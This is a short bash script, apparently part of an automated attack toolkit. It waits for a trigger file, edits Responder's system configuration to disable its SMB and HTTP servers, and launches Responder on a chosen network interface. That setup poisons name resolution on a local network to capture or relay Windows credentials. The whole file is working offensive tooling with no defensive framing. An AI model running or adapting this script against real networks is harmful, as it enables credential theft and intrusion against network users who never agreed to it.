#!/usr/bin/env bash

LBlue='\033[0;94m'      # Light Blue
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

# Hide the cursor
tput civis

# Wait for .attack file to be created
while [ ! -f .attack ]; do
    clear
    echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Responder...${Color_Off}\n"
    sleep 5
done

# Check if iface.txt exists
if [ ! -f iface.txt ]; then
    # If not, create the file and write 'eth0' as default interface
    echo "eth0" > iface.txt
    echo "iface.txt not found, creating file with default interface 'eth0'."
fi

# Read the interface from iface.txt
IFACE=$(cat iface.txt)

# Modify parameters in Responder.conf
if perl -pi -e "s[SMB = On][SMB = Off]g" /usr/share/responder/Responder.conf; then
    echo "SMB disabled successfully."
else
    echo "Failed to modify SMB setting in Responder.conf."
    exit 1
fi

if perl -pi -e "s[HTTP = On][HTTP = Off]g" /usr/share/responder/Responder.conf; then
    echo "HTTP disabled successfully."
else
    echo "Failed to modify HTTP setting in Responder.conf."
    exit 1
fi

# Start Responder
if responder -I $IFACE; then
    echo "Responder started successfully on interface $IFACE."
else
    echo "Failed to start Responder on interface $IFACE."
    exit 1
fi

# Restore the cursor
tput cnorm
